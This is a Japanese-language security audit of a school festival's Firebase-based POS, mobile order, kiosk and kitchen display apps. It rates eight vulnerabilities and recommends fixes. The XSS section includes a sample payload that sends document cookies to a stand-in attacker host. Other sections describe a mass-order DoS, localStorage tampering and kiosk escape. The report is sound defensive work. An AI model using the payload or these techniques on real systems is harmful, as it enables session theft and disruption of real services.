# 南陵祭2026 POS・モバイルオーダー・店舗運用 脆弱性分析レポート

**文書番号**: SEC-AUDIT-2026-03  
**対象領域**: POS・モバイルオーダー・店舗運用（POS & Mobile Order / KDS / Kiosk）  
**監査種別**: ソースコード静的セキュリティ診断・アーキテクチャ整合性監査  
**作成日**: 2026年9月9日  
**監査官**: POS・モバイルオーダー・店舗運用専門監査官 (POS & Mobile Order Auditor)  
**対象リポジトリ**: `nanryosai-2026`  

---

## 1. エグゼクティブサマリ (Executive Summary)

南陵祭2026における店舗運営系フロントエンドアプリケーション群（モバイルオーダー、セルフオーダーキオスク、店頭POSレジ、厨房KDS、呼出モニター、店舗管理者ポータル）およびバックエンドCloud Functions / Firestoreセキュリティルールを対象に、セキュリティ監査を実施した。

本システムは、Firebase AuthenticationのCustom Claimsによる権限管理、Firestoreの厳格なセキュリティルール、Cloud Functions経由でのトランザクション処理など、文化祭システムとしては極めて先進的かつ堅牢な「ゼロトラスト・多層防御」アーキテクチャが設計されている。特に**商品金額のサーバーサイド再計算**や**注文ステータス更新のCloud Functions一元化**は高く評価できる。

しかしながら、詳細なソースコード診断の結果、**厨房・提供モニターにおける蓄積型XSS（Stored XSS）**、**大量注文によるサービス拒否（DoS）**、**店頭受取時の受取番号推測・商品横取りリスク**、**店頭iPad（SOK）からの管理者ポータル脱出リスク**、**AirPay手動決済とシステム連動の不整合（冤罪BANリスク）** など、本番稼働において重大なインシデントに直結し得る脆弱性および運用上の盲点が複数特定された。

### 深刻度別 検出脆弱性サマリ

| 識別子 | 脆弱性項目 / リスク名 | 深刻度 (CVSS v3) | 影響画面 / コンポーネント |
|---|---|---|---|
| **VULN-01** | カスタマイズ・商品名の未エスケープによる蓄積型XSS (Stored XSS) | **High (7.5)** | `kitchen.html`, `presenter.html`, `pos-alert.js` |
| **VULN-02** | 注文数量の上限値バリデーション欠如による大量注文DoS攻撃 | **High (7.1)** | `functions/index.js (createOrder)`, `mobile-order.html` |
| **VULN-03** | キオスク端末（SOK iPad）の店舗管理者セッション保持とブラウザ脱出 | **High (7.2)** | `pos/sok.html`, 現場運用 |
| **VULN-04** | LocalStorage過信による認証バイパス表示とスプレッドシートURL露出 | **Medium (5.3)** | `pos/portal.html`, `firestore.rules` |
| **VULN-05** | 受取番号（連番）の容易な推測可能性と店頭商品横取りリスク | **Medium (5.8)** | `functions/index.js (getNextReceiptNumber)`, 現場受渡 |
| **VULN-06** | 店舗ログイン（`loginStore`）のレートリミット欠如（総当たり耐性不足） | **Medium (5.3)** | `functions/index.js (loginStore)`, `pos/portal.html` |
| **VULN-07** | AirPay手動目視決済の偽装提示リスクおよび受渡完了押し忘れによる冤罪BAN | **Medium (6.0)** | 現場オペレーション, `functions/index.js (abandonStaleOrders)` |
| **VULN-08** | グローバルオブジェクト（`firebaseFunctions` 等）の不要な露出 | **Low (3.1)** | `pos/portal.html` |

---

## 2. 調査対象スコープと構成

### 2.1 調査対象ファイル

1. `pos/portal.html` (173KB) — 店舗管理者ポータル（売上分析、商品管理、営業切替）
2. `pos/mobile-order.html` (110KB) — 在校生専用モバイルオーダーWebアプリ
3. `pos/sok.html` (85KB) — 店頭iPad用セルフオーダーキオスク
4. `pos/sok-to.html` (39KB) — 来場者スマホ用キオスク注文引継ぎ・確定画面
5. `pos/status.html` (51KB) — 注文ステータスリアルタイム追跡画面
6. `pos/kitchen.html` (38KB) — 調理場用キッチンディスプレイシステム (KDS)
7. `pos/presenter.html` (40KB) — 仕上げ・トッピング・呼出ディスプレイ
8. `pos/pos.html` (44KB) — 店頭対面レジ端末アプリ
9. `pos/monitor.html` (27KB) — 店頭設置型呼出番号モニター
10. `pos/pos-alert.js` / `pos/firebase-messaging-sw.js` — 店舗向け緊急通知・FCM Service Worker
11. （関連バックエンド）`functions/index.js`, `firestore.rules`

### 2.2 システムアーキテクチャ概要

```
[一般来場者] ──────────> 店頭iPad (sok.html) ──(createSokProvisional)──┐
                             │ (QR生成)                                │
                             v                                         │
                        来場者スマホ (sok-to.html) ──(claim/confirm)───┤
                                                                       │
[在校生] ──────────────> モバイル端末 (mobile-order.html) ──(createOrder)──┼──> [Cloud Functions]
                                                                       │       │
[店頭スタッフ] ────────> 店頭レジ (pos.html) ──────────(createOrder)───┤       │ ACIDトランザクション
                                                                       │       v
[厨房・提供] ──────────> KDS (kitchen.html / presenter.html) ──────────┼──> [Cloud Firestore]
                                                                       │       │ /orders, /items, /stores
[店舗責任者] ──────────> ポータル (portal.html) ───────────────────────┘       │
                                                                               v
[店頭モニター] ────────> 呼出画面 (monitor.html) <────── onSnapshot (リアルタイム同期)
```

---

## 3. 重点チェック項目1: 注文フローの整合性と金額・数量改ざん

### 3.1 金額改ざんの検証結果: 【安全（PASS）】

- **クライアント側実装 (`mobile-order.html` L2910, `sok.html` L2440, `pos.html` L1259)**:
  いずれの画面も、注文確定時には商品ID (`itemId` / `productId`)、数量 (`quantity`)、カスタマイズ (`customizations`) のみを送信しており、**金額 (`price`, `totalPrice`) はクライアントから送信していない**。
- **サーバー側実装 (`functions/index.js` L820〜L850, L2085〜L2115)**:
  `db.getAll(...itemRefs)` により Firestore の `items` コレクションから最新の公式価格を直接取得し、サーバーサイドで `totalPrice += product.price * item.quantity` を計算して注文ドキュメントに記録している。
- **評価**:
  クライアント側でブラウザの開発者ツールやプロキシツールを用いて価格を書き換えても、決済・注文金額には一切反映されない。金額改ざん攻撃に対して極めて堅牢である。

---

### 3.2 数量バリデーションの検証結果: 【要改善（FAIL / High Risk）】

#### (1) ゼロ・負数チェック: 【安全（PASS）】
- `functions/index.js` L840:
  ```javascript
  if (!Number.isInteger(item.quantity) || item.quantity <= 0) {
    throw new functions.https.HttpsError("invalid-argument", "数量は1以上の整数である必要があります。");
  }
  ```
  ゼロ (`0`) や負数 (`-1`)、小数 (`1.5`)、文字列などはサーバー側で弾かれる。

#### (2) 上限値（最大数量）チェックの欠如: 【脆弱性: VULN-02】
- **現状**:
  - クライアント側 (`mobile-order.html` L2719, `sok.html` L2275): `Math.max(1, activeQty + delta)` となっており、上限のキャップがない。
  - サーバー側 (`functions/index.js` L839〜L843): `item.quantity <= 0` の下限チェックのみで、**上限値（例: 1注文あたり最大10個、合計30個まで等）の検証が一切存在しない**。
- **脅威シナリオ**:
  悪意あるユーザーがスクリプトまたはDevToolsから `quantity: 9999` の注文リクエストを送信した場合、サーバー側チェックを通過し、合計金額数百万円の注文が確定する。
  在庫管理が「販売可能フラグ (`isAvailable`)」のみで実数量の在庫引き落としが存在しないため、厨房端末（`kitchen.html`）に「たこ焼き 9,999個」のオーダーカードが突如出現し、厨房オペレーションが完全停止（DoS攻撃）に追い込まれる。
- **是正勧告**:
  - `functions/index.js` の `createOrder` および `createSokProvisional` に、1品あたりの上限（例: 最大5個〜10個）および1注文あたりの合計点数上限（例: 最大20個）を設ける。

---

### 3.3 トッピング・カスタマイズの整合性: 【潜在的リスク（Medium Risk）】

- **現状**:
  `customizations` は `[{ mode: "NO"|"ADD", target: "マヨネーズ" }]` の形式で保存される。
  現在の南陵祭メニューは「無料トッピング（抜き・追加）」のみを想定しており、追加料金の概念が存在しない。
- **潜在的脆弱性**:
  もし将来のアップデートや特定店舗で「大盛り（+100円）」「チーズトッピング（+50円）」などの有料カスタマイズを導入した場合、サーバー側 `createOrder` には `customizations` に対する価格加算ロジックが存在しないため、**有料トッピングを0円で無限に追加できてしまう脆弱性** となる。
- **バリデーション欠如**:
  `item.customizations` の中身（配列長、文字列長、許可されたトッピング名か否か）のサーバーサイド検証が欠如しており、巨大なテキストや不正な文字列を無制限に送り込める（後述のXSSに波及）。

---

## 4. 重点チェック項目2: 注文ステータス・IDOR (Insecure Direct Object References)

### 4.1 注文ID (`orderId`) と受取番号 (`receiptNumber`) の推測可能性

| 識別子 | 発行主体 / 形式 | エントロピー / 空間 | 推測可能性 | リスク評価 |
|---|---|---|---|---|
| **`orderId`** | Firestore Auto-ID (英数字20文字) | 約120ビット | **推測不可能** | 安全 (PASS) |
| **`receiptNumber`** | Cloud Functions 内部連番カウンター | 100〜999 (POS)<br>2000〜2999 (SOK)<br>7000〜7999 (Mobile) | **極めて容易（完全連番）** | **要対策 (VULN-05)** |

#### 受取番号推測による「店頭商品横取り」リスク (VULN-05)
1. **メカニズム**:
   `getNextReceiptNumber`（`functions/index.js` L189〜L232）は、カウンタードキュメント `counters/receipt_${channel}` を基に 1 ずつインクリメントする単純連番である。
2. **攻撃シナリオ**:
   - 悪意ある者が店頭呼出モニター（`monitor.html`）を眺め、「お呼出中」に `7015` が表示されたのを確認する。
   - 店頭受取カウンターに赴き、「7015番です」とスタッフ（高校生）に口頭で告げる、あるいは自身のスマホに偽の受取画面（7015番と表示させたモック画面やスクショ）を表示して提示する。
   - 混雑した模擬店の現場で、生徒スタッフが画面の動的要素（右上の同期アイコンや更新秒数）を精査せずに商品を手渡してしまうと、正規の注文者が受け取れなくなる。
3. **是正勧告**:
   - 受渡確認時、受取番号だけでなく「注文IDの下4桁」を併記して確認させる（例: `No. 7015 (認証コード: a9F2)`）。

---

### 4.2 他人の注文ステータス変更（キャンセル・完了）の検証結果: 【安全（PASS）】

クライアントから他人の注文ステータスを不正に変更できるか検証した。

- **Firestore直接書き込み (`firestore.rules` L96〜L98)**:
  `allow update: if isSuperAdmin();`
  SuperAdmin以外、クライアントからの直接更新は全拒否されている。
- **Cloud Functions (`kitchenComplete`, `callForPickup`, `completeOrder`, `cancelOrder`, `adminUpdateOrderStatus`)**:
  共通ヘルパー `getOrderForTransition`（`functions/index.js` L918〜L941）により、以下が厳格に判定される：
  ```javascript
  if (token.role !== "store_admin" || token.storeId !== orderData.storeId) {
    throw new functions.https.HttpsError("permission-denied", "店舗管理者権限が必要です。");
  }
  ```
- **SOKキャンセル (`cancelSokOrder`)**:
  `order.userId === context.auth.uid` かつ `order.status == null`（未確定）のみキャンセル可能。
- **評価**:
  一般生徒や来場者が、他人の注文ステータスを勝手にキャンセルしたり受取完了にすることは**完全に防御されている**。

---

### 4.3 注文データの閲覧権限（IDOR情報漏洩）の検証結果: 【一部仕様上の公開（Informational）】

- **`firestore.rules` L70〜L91**:
  ```javascript
  allow get: if
    isStoreAdmin(resource.data.storeId) || isSuperAdmin()
    || (isAuthenticated() && request.auth.uid == resource.data.userId)
    || (resource.data.orderChannel == "sok" && resource.data.sokStatus == "pending")
    || resource.data.status == "ready_for_pickup";
  ```
- **分析**:
  - `ready_for_pickup`（呼出中）の注文は、`monitor.html` の表示要件のため全ユーザーに `get` / `list` が許可されている。
  - ただし、Firestoreの注文ドキュメントには氏名・電話番号・メールアドレス等の個人情報（PII）は一切保存されておらず、UIDと商品名・数量のみであるため、データが公開されてもプライバシー侵害の危険性は低い。

---

## 5. 重点チェック項目3: セルフオーダーキオスク (SOK) & 呼出画面

### 5.1 キオスク端末（店頭iPad）の脱出・改ざんリスク (VULN-03)

#### (1) 店舗管理者権限を保持したまま店頭に置かれる構造的リスク
- `pos/sok.html` は起動時、`token.role === "store_admin"` かつ `token.storeId === storeId` を要求する（L1727）。
- すなわち、**店頭で不特定多数の来場者が直接タッチ操作するiPadは、店舗管理者（フル権限）のFirebase認証セッションを保持している**。

#### (2) ブラウザ脱出と権限奪取シナリオ
- 学校祭の現場で、iPadがiOSの「アクセスガイド（Guided Access）」で画面ロックされていない場合：
  - 悪意ある来場者（または生徒）がSafariのURLバーをタップし、`../pos/portal.html` または `../pos/pos.html` を開く。
  - `portal.html` は既に `store_admin` 権限を持っているため、パスワード入力なしに店舗ダッシュボードが開く。
  - 攻撃者は、**商品の価格改ざん、勝手な販売停止・緊急停止、過去の全売上データの閲覧・CSVダウンロード、架空注文の大量投入** を自由に行うことができる。
- **是正勧告**:
  1. **運用の絶対ルール化**: SOK iPad設置時は、必ずiOS設定の「アクセスガイド」を有効化し、ハードウェアボタンとURLバー領域のタッチを無効化する。
  2. **SOK専用ロールの分離（推奨）**: SOK端末用に `role: "sok_kiosk"` という専用Custom Claimsを設け、仮注文作成（`createSokProvisional`）のみを許可し、ポータルやレジへのアクセス権を付与しない設計にする。

---

### 5.2 SOK注文の競合・QRハイジャックリスク

- **QRコードの有効期限**: 5分（`expireSokOrders` スケジュール関数により自動失効）。
- **トランザクション排他制御**:
  `claimSokOrder`（`functions/index.js` L2187〜L2214）は Firestore トランザクションを用いており、最初に claim した1名のみが成功し、以後は `failed-precondition` で弾かれる。
- **残存リスク**:
  店頭iPadでQRコードが表示されている30秒の間に、注文者以外の第三者が遠くから高倍率カメラ等でQRコードを読み取り、先にログインして `claimSokOrder` を奪取する「QR横取り」の理論的リスクが存在する。ただし、奪取してもキャッシュレス決済を肩代わりするだけ（あるいはキャンセルするだけ）であり、金銭的メリットは薄い。

---

### 5.3 呼出画面 (`monitor.html`) の安全性

- **個人情報露出**: なし（受取番号のみ表示）。
- **画面上の操作リスク**:
  画面左上にハンバーガーメニュー「☰」（L572）が配置されており、タップすると「従業員メニュー」が開き、全画面解除やログアウトが可能になっている。店頭のサイネージ用iPadが手の届く場所にある場合、いたずらでログアウトされたり画面を閉じられるリスクがあるため、サイネージ表示時はメニューボタンを非表示化（または長押し隠しコマンド化）することが望ましい。

---

## 6. 重点チェック項目4: 店舗管理者ポータル (`portal.html`) & KDS (`kitchen.html`)

### 6.1 LocalStorage過信による認証バイパス表示と情報漏洩 (VULN-04)

#### (1) 脆弱性の構造
`pos/portal.html` の L3538〜L3553:
```javascript
// Check Cached Login
const cachedId = localStorage.getItem("nanryosai_store_id");
...
if (cachedId) {
  currentStoreId = cachedId;
  startApp();
  return;
}
```
`portal.html` は、在校生Googleアカウントでログインしていれば、`localStorage` に `nanryosai_store_id` が入っているだけで**パスワード検証を経ずに `startApp()` を実行**する。

#### (2) 被害シナリオ: 他店舗のスプレッドシートURL漏洩
`startApp()` 内（L3686〜L3702）:
```javascript
const storeRef = doc(db, "stores", currentStoreId);
const storeSnap = await getDoc(storeRef);
if (storeSnap.exists()) {
  const data = storeSnap.data();
  ...
  if (data.spreadsheetUrl) {
    const linkSpreadsheet = document.getElementById("link-spreadsheet");
    linkSpreadsheet.href = data.spreadsheetUrl;
    linkSpreadsheet.style.display = "block";
  }
}
```
`firestore.rules` において `match /stores/{storeId}` は `allow read: if true;` である。
したがって、任意の在校生がコンソールで `localStorage.setItem("nanryosai_store_id", "他店舗ID")` を設定してリロードするだけで、**他店舗の売上集計GoogleスプレッドシートのURL（非公開であるべき機密リンク）が画面に表示され、閲覧・ダウンロードが可能になる**。

#### (3) 是正勧告
1. `localStorage` の値だけでなく、`await getClaims()` で取得したトークンの `claims.storeId` と一致しているかを必ず検証する。一致しない場合はキャッシュを破棄してパスワード入力を要求する。
2. `stores` ドキュメントから `spreadsheetUrl` を削除し、読み取り禁止の `store_secrets/{storeId}` に移管する。

---

### 6.2 店舗ログイン (`loginStore`) のレートリミット欠如 (VULN-06)

- `functions/index.js` L612〜L703 の `loginStore` は、店舗IDとパスワードを受け取って認証する。
- パスワード検証失敗時の**試行回数制限（アカウントロック、IP単位・UID単位のレートリミット、Exponential Backoff）が実装されていない**。
- 高校の模擬店のパスワード（生徒間で共有されるもの）は単純な文字列（単語や数字数桁）になりやすく、スクリプトによる総当たり攻撃（ブルートフォース）で容易に突破される危険性がある。

---

## 7. 重点チェック項目5: AirPay端末・外部決済連携と運用オペレーションリスク

### 7.1 人間目視確認依存による決済不正リスク (VULN-07)

- **アーキテクチャの制約**:
  本システムは AirPay 端末との API 自動連携（決済成功ウェブフック等）を行っておらず、Cloud Functions では `paymentMethod: "au_pay_manual"` と記録されるのみである。
- **手口とリスク**:
  1. **決済完了画面のモック提示（画面見せ不正）**:
     来場者が自身のスマートフォンで「au PAY / PayPay 決済完了」を模した偽のWebページや動画を再生し、高校生スタッフに見せる。スタッフがAirPay端末側の「決済完了」レシートや端末液晶を確認せずに商品を引き渡してしまう。
  2. **AirPay端末の金額誤入力**:
     レジ担当の生徒が、1,200円の会計を「120円」と誤ってAirPay端末に手入力して決済を完了させてしまうオペレーション事故。

---

### 7.2 ステータス不整合と冤罪BANリスク

#### (1) 背景仕様
`functions/index.js` L1923〜L2015（`abandonStaleOrders`）:
呼出状態（`ready_for_pickup`）になってから5分以上経過した注文は、毎分実行のバッチジョブにより自動的に `abandoned`（受け取り期限切れ廃棄）へ移行し、注文者のペナルティスコアが加算され、最終的にBAN（利用停止）される設計となっている。

#### (2) オペレーション上の致命的リスク
- ピーク時、受取カウンターの生徒スタッフが激務により、商品を手渡した後に画面上の**「受取完了」ボタン（`completeOrder`）を押し忘れる**事態が多発することが予想される。
- 商品を受け取って美味しく食べている来場者・生徒の注文が、システム上は「呼出から5分経過」と判定され、裏で自動的に `abandoned` に倒される。
- **結果として、正規に商品を受け取った無実の生徒が「5分放置・商品廃棄」扱いとなり、ペナルティが累積して冤罪BANされる**。
- **是正勧告**:
  - `abandonStaleOrders` による自動 `abandoned` 判定を即時BANに直結させず、スタッフ側の「受取完了」操作漏れの可能性を考慮した救済・手動確認フローを設ける。

---

## 8. 重点チェック項目6: クライアント側ストレージ (LocalStorage / SessionStorage)

| ストレージ | キー名 | 格納データ | 機密性評価 | リスクと改善点 |
|---|---|---|---|---|
| `localStorage` | `nanryosai_store_id` | 店舗ID (例: `"101"`) | 低（識別子のみ） | 値を過信して認証ガードをスキップする設計に問題あり (VULN-04) |
| `sessionStorage` | `sok-onboarded` | `"1"` | なし（UIフラグ） | 安全 (PASS) |
| `localStorage` | Firebase Auth トークン (内部) | JWT トークン | 高（Firebase管理） | Firebase SDK の標準仕様であり適切に保護 |

パスワードや平文シークレット、決済情報などは LocalStorage / SessionStorage に一切保存されておらず、クライアントストレージの取り扱い自体は概ね標準に準拠している。

---

## 9. コードレベルの重大脆弱性詳解

### 【重大脆弱性】カスタマイズ・商品名の未エスケープによる蓄積型XSS (VULN-01)

#### (1) 脆弱性の箇所
`pos/kitchen.html` L966〜L970:
```javascript
return `<div class="customization-row">
          <span class="cust-badge ${badgeClass}">${displayMode}</span>
          <span class="cust-text">${target}</span>
        </div>`;
```
`pos/presenter.html` L966〜L970:
```javascript
return `<div class="customization-row">
          <span class="cust-badge ${badgeClass}">${displayMode}</span>
          <span class="${textClass}">${target}</span>
        </div>`;
```
`pos/pos-alert.js` L43:
```javascript
<span>${data.posAlertMessage.replace(/\n/g, "<br>")}</span>
```

#### (2) 攻撃経路と影響
1. 攻撃者（生徒）が `mobile-order.html` または直接 API から `createOrder` を呼び出す：
   ```json
   {
     "orderChannel": "mobile",
     "storeId": "101",
     "items": [{
       "itemId": "item_xxx",
       "quantity": 1,
       "customizations": [{
         "mode": "ADD",
         "target": "<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">"
       }]
     }]
   }
   ```
2. 厨房KDS（`kitchen.html`）および仕上げモニター（`presenter.html`）は Firestore の `orders` をリアルタイム受信し、`div.innerHTML = buildItemsHtml(data.items)` でそのまま DOM に挿入する。
3. **厨房・受取カウンターに設置されたiPad上で、即座に任意のJavaScriptが実行される（Stored XSS）**。
4. KDS端末は `store_admin` 権限を保持しているため、攻撃者のスクリプトによって店舗の全メニュー削除、注文の全キャンセル、偽のアラート表示などが遠隔から意図のままに実行される。

#### (3) 是正コード例
HTMLエスケープ関数を適用するか、`textContent` を用いてDOM要素を生成する：
```javascript
function escapeHtml(str) {
  return String(str ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// 修正後
return `<div class="customization-row">
          <span class="cust-badge ${badgeClass}">${escapeHtml(displayMode)}</span>
          <span class="cust-text">${escapeHtml(target)}</span>
        </div>`;
```

---

## 10. 是正勧告と優先改善ロードマップ (Priority Action Plan)

本監査で特定された脆弱性および運用リスクに対し、以下の優先度で対策を実施することを強く推奨する。

### フェーズ 1: 【最優先・緊急対応】（本番運用前の必須修正）

1. **蓄積型XSSの撲滅 (VULN-01)**:
   - `pos/kitchen.html`, `pos/presenter.html`, `pos/pos-alert.js`, `pos/portal.html` の全 `innerHTML` 挿入箇所に対し、HTMLエスケープ関数（`escapeHtml`）を適用、または `textContent` 生成へ書き換える。
2. **注文数量の上限値バリデーション追加 (VULN-02)**:
   - `functions/index.js` の `createOrder` および `createSokProvisional` に、1商品あたり最大10個、1注文あたり合計20個のバリデーションルールを追加。
   - `customizations` 配列の長さ（最大5個まで）および各文字列長（最大20文字まで）のバリデーションを追加。
3. **受取時なりすまし防止コードの導入 (VULN-05)**:
   - `status.html` および各受渡画面で、受取番号と併せて「注文ID下4桁」または「動的照合カラー」を表示させ、店頭確認に用いる。

### フェーズ 2: 【重要運用対策】（機器キッティング・現場マニュアル）

4. **キオスクiPad（SOK）のアクセスガイド完全施錠 (VULN-03)**:
   - SOK用iPadは、iOS設定の「アクセスガイド」を必ずONにし、画面上部のURLバーおよびスワイプジェスチャーを無効化した状態で店頭に固定設置する。
5. **AirPay目視確認のオペレーション徹底と受渡押し忘れ防止 (VULN-07)**:
   - 店舗マニュアルに「お客様のスマホ画面ではなく、**必ずAirPay端末本体の決済完了緑色画面/レシートを確認すること**」を赤字太字で義務化。
   - 受渡カウンターに「商品渡し＝画面の完了ボタンを押す」チェック体制を徹底し、冤罪BANを防止。

### フェーズ 3: 【セキュリティ強化】（堅牢化）

6. **ポータルのLocalStorage依存排除とスプレッドシートURLの秘匿化 (VULN-04)**:
   - `pos/portal.html` で `claims.storeId` の整合性チェックを必須化。
   - `stores` コレクションから `spreadsheetUrl` を除去し、`store_secrets` に隔離。
7. **店舗ログインへのレートリミット導入 (VULN-06)**:
   - `loginStore` に連続失敗時のバックオフまたはIP制限を導入。
8. **グローバル変数の削除 (VULN-08)**:
   - `pos/portal.html` の `window.firebaseFunctions` や `window.httpsCallable` などのデバッグ用グローバル公開を本番コードから削除。

---
**報告書作成完了**: 2026年9月9日  
**POS・モバイルオーダー・店舗運用専門監査官 (POS & Mobile Order Auditor)**
